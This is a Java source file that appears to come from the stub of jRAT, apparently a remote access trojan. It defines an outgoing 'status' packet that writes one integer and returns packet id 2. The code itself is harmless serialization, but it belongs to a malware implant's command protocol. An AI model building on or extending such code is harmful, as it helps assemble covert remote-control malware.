package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet2Status extends AbstractOutgoingPacket {

	private int status;

	public Packet2Status(int status) {
		this.status = status;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(status);
	}

	@Override
	public byte getPacketId() {
		return (byte) 2;
	}

}